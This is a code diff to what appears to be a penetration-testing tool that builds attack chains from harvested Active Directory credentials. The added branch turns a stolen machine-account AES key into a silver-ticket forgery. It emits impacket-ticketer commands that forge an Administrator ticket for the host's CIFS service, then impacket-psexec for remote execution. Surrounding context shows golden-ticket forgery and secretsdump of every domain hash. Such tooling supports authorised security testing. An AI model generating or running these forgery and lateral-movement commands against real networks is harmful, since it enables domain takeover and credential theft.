@@ -1028,7 +1028,12 @@ def run(report, store, ui=None):
         # iter-113: krbtgt AES key = R-GOLDEN-tier. Emit a golden-ticket
         # variant that forges Administrator via ticketer + aesKey (impacket
         # accepts aes256 for -aesKey). Otherwise regular Pass-the-Key.
+        # iter-114: machine account AES key (HOST$) = R-SILVER-tier. Silver
+        # ticket forgery targeting the machine's own CIFS SPN uses -aesKey
+        # in the same ticketer command form; identical value tier as the
+        # NT-hash R-SILVER chain.
         _is_krbtgt = _ptk_user.lower() == "krbtgt"
+        _is_machine = (not _is_krbtgt) and _ptk_user.endswith("$")
         if _is_krbtgt:
             _sid_ptk = store.domain_sid() or "<S-1-5-21-...>"
             chains.append(Chain("R-GOLDEN", "golden ticket via krbtgt AES key",
@@ -1041,6 +1046,20 @@ def run(report, store, ui=None):
                     f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
                     f"'{_ptk_dom}/Administrator@{_ptk_fqdn}'   "
                     f"# every domain hash",
+                ], src=_ev.source, line=_ev.line))
+        elif _is_machine:
+            _sid_ptk = store.domain_sid() or "<S-1-5-21-...>"
+            _host_short = _ptk_user.split("\\")[-1].rstrip("$")
+            chains.append(Chain("R-SILVER", "silver ticket via machine AES key",
+                f"machine AES key {_ptk_user} -> silver ticket forgery for {_host_short}",
+                crit=9, conf=0.9, ready=1.4, prox=0.9,       # score 10.2
+                commands=[
+                    f"impacket-ticketer -aesKey {_ev.hash} "
+                    f"-domain-sid {_sid_ptk} -domain {_ptk_dom} "
+                    f"-spn cifs/{_host_short}.{_ptk_dom} Administrator",
+                    f"export KRB5CCNAME=Administrator.ccache",
+                    f"impacket-psexec -k -no-pass -dc-ip {_ptk_dc} "
+                    f"'{_ptk_dom}/Administrator@{_host_short}.{_ptk_dom}'",
                 ], src=_ev.source, line=_ev.line))
         else:
             # Score is between R7 (11ish for domain user hash) and R-GOLDEN
